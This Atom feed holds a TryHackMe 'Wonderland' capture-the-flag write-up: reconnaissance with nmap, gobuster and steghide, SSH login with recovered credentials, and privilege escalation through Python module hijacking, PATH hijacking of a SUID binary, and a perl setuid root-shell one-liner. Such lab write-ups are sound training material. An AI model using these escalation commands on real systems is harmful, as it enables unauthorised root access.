<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <title>Writups - wonderland</title>
    <subtitle>A diary dedicated to exploring the world of cybersecurity and technology.</subtitle>
    <link href="https://theanxiuser.github.io/writups/tags/wonderland/atom.xml" rel="self" type="application/atom+xml"/>
    <link href="https://theanxiuser.github.io/writups"/>
    <generator uri="https://www.getzola.org/">Zola</generator>
    <updated>2024-10-22T00:00:00+00:00</updated>
    <id>https://theanxiuser.github.io/writups/tags/wonderland/atom.xml</id>
    <entry xml:lang="en">
        <title>Wonderland - TryHackMe Writup</title>
        <published>2024-10-22T00:00:00+00:00</published>
        <updated>2024-10-22T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/wonderland/" type="text/html"/>
        <id>https://theanxiuser.github.io/writups/chapters/wonderland/</id>
        
        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
  &lt;div&gt;
    &lt;img src=&quot;wonderland.jpeg&quot; alt=&quot;overpass&quot; width=&quot;100&quot;&#x2F;&gt;
  &lt;&#x2F;div&gt;
  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
    &lt;i&gt;Fall down the rabbit hole and enter wonderland.&lt;&#x2F;i&gt;
  &lt;&#x2F;div&gt;
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;scanning&quot;&gt;Scanning&lt;&#x2F;h2&gt;
&lt;p&gt;Target IP: 10.10.100.148&lt;&#x2F;p&gt;
&lt;p&gt;Scanning with nmap, we found two ports are open.&lt;&#x2F;p&gt;
&lt;pre&gt;
❯ nmap -sV 10.10.100.148 -v
Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2024-10-17 14:49 +0545
.....
PORT   STATE SERVICE VERSION
22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80&#x2F;tcp open  http    Golang net&#x2F;http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel

.....
Nmap done: 1 IP address (1 host up) scanned in 39.25 seconds
&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;&#x2F;h2&gt;
&lt;p&gt;Enumerating port 80. Content in the home page is &lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;wonderland&#x2F;home_page.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;To find out the directories, we will use gobuster as&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -u http:&#x2F;&#x2F;10.10.100.148&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In path &lt;code&gt;&#x2F;r&lt;&#x2F;code&gt;, we have the message&lt;&#x2F;p&gt;
&lt;pre&gt;
Keep Going.
&quot;Would you tell me, please, which way I ought to go from here?&quot;
&lt;&#x2F;pre&gt;
&lt;p&gt;We are not getting anything much, faced timeout error. Maybe there is something in the white rabit, as it says follow the white rabbit.&lt;&#x2F;p&gt;
&lt;p&gt;As we can see, there is &lt;code&gt;hint.txt&lt;&#x2F;code&gt; inside the image. Now extract and follow the hint.&lt;&#x2F;p&gt;
&lt;pre&gt;
❯ steghide --info white_rabbit_1.jpg
&quot;white_rabbit_1.jpg&quot;:
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? (y&#x2F;n) y
Enter passphrase: 
  embedded file &quot;hint.txt&quot;:
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
&lt;&#x2F;pre&gt;
&lt;p&gt;No need to pass passphrase, &lt;code&gt;steghide --extract -sf white_rabbit_1.jpg&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;After following the path mentioned in the hint, we got the page&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;wonderland&#x2F;open_the_door.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Some content hidden is found there&lt;&#x2F;p&gt;
&lt;pre&gt;
alice:HowDothThe......HisShiningTail
    image src=&quot;&#x2F;img&#x2F;alice_door.png&quot;
&lt;&#x2F;pre&gt;
&lt;p&gt;Checking if the information is hidden in alice_door. There is nothing, maybe above hidden content is username and password for ssh. Lets try for this and here we go&lt;&#x2F;p&gt;
&lt;h1 id=&quot;gaining-access&quot;&gt;Gaining Access&lt;&#x2F;h1&gt;
&lt;p&gt;Here the root flag and user flag are in inverse place&lt;&#x2F;p&gt;
&lt;pre&gt;
Last login: Thu Oct 17 09:37:31 2024 from 10.17.58.84
alice@wonderland:~$ whoami
alice
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ cat root.txt
cat: root.txt: Permission denied
alice@wonderland:~$ ls &#x2F;root
ls: cannot open directory &#x27;&#x2F;root&#x27;: Permission denied
alice@wonderland:~$ sudo ls &#x2F;root
[sudo] password for alice: 
Sorry, user alice is not allowed to execute &#x27;&#x2F;bin&#x2F;ls &#x2F;root&#x27; as root on wonderland.
alice@wonderland:~$ cat &#x2F;root&#x2F;user.txt
thm{&quot;Curiouser and curiouser!&quot;}
&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;&#x2F;h2&gt;
&lt;pre&gt;
alice@wonderland:~$ ls -l walrus_and_the_carpenter.py 
-rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.py
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin

User alice may run the following commands on wonderland:
    (rabbit) &#x2F;usr&#x2F;bin&#x2F;python3.6 &#x2F;home&#x2F;alice&#x2F;walrus_and_the_carpenter.py
alice@wonderland:~$ cat walrus_and_the_carpenter.py 
import random
poem = &quot;&quot;&quot;The sun was shining on the sea,
Shining with all his might:
He did his very best to make
.....
And that was scarcely odd, because
They’d eaten every one.&quot;&quot;&quot;

for i in range(10):
    line = random.choice(poem.split(&quot;\n&quot;))
    print(&quot;The line was:\t&quot;, line)
&lt;&#x2F;pre&gt;
&lt;p&gt;We can run this file but can not edit. Here &lt;code&gt;random&lt;&#x2F;code&gt; module is imported. Lets make a random.py in the same directory with &lt;&#x2F;p&gt;
&lt;pre&gt;
import os

os.system(&quot;&#x2F;bin&#x2F;bash&quot;)
&lt;&#x2F;pre&gt;
&lt;p&gt;Running &lt;code&gt;sudo -u rabbit &#x2F;usr&#x2F;bin&#x2F;python3.6 &#x2F;home&#x2F;alice&#x2F;walrus_and_the_carpenter.py&lt;&#x2F;code&gt;, we are now &lt;code&gt;rabbit&lt;&#x2F;code&gt; user. Looking into home directory of rabbit we found a file &lt;code&gt;teaParty&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;SUID bit is on for teaParty&lt;&#x2F;p&gt;
&lt;pre&gt;
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
&lt;&#x2F;pre&gt;
&lt;p&gt;Running the file, we have following output. It shows that date command is executing so we can manipulate it.&lt;&#x2F;p&gt;
&lt;pre&gt;
rabbit@wonderland:&#x2F;home&#x2F;rabbit$ .&#x2F;teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Thu, 17 Oct 2024 11:08:04 +0000
Ask very nicely, and I will give you some tea while you wait for him
w
Segmentation fault (core dumped)
&lt;&#x2F;pre&gt;
&lt;p&gt;I have create date file with content &lt;code&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;code&gt; and added it to the path by &lt;code&gt;export PATH=&#x2F;home&#x2F;rabbit:$PATH&lt;&#x2F;code&gt;. Now running the file, we are the hatter&lt;&#x2F;p&gt;
&lt;pre&gt;
rabbit@wonderland:&#x2F;home&#x2F;rabbit$ .&#x2F;teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:&#x2F;home&#x2F;rabbit$ whoami
hatter
&lt;&#x2F;pre&gt;
&lt;p&gt;I have password.txt file in the home directory of hatter, which is the password of user hatter. &lt;&#x2F;p&gt;
&lt;p&gt;By traversing into different user, we are not able to see the root flag. Now using linpeas for the further enumeration.&lt;&#x2F;p&gt;
&lt;p&gt;We have perl, that can be used to esclate privilege. Used GTFOBins for the exploit &lt;&#x2F;p&gt;
&lt;pre&gt;
hatter@wonderland:~$ perl -e &#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;&#x2F;bin&#x2F;sh&quot;;&#x27;
# 
# whoami
root
# cat &#x2F;home&#x2F;alice&#x2F;root.txt
thm{Twinkle, twinkle, .............. what you&#x27;re at!}
&lt;&#x2F;pre&gt;
&lt;p&gt;Thats all. This is more about the post enumeration and post exploitation things.&lt;&#x2F;p&gt;
&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
</content>
        
    </entry>
</feed>
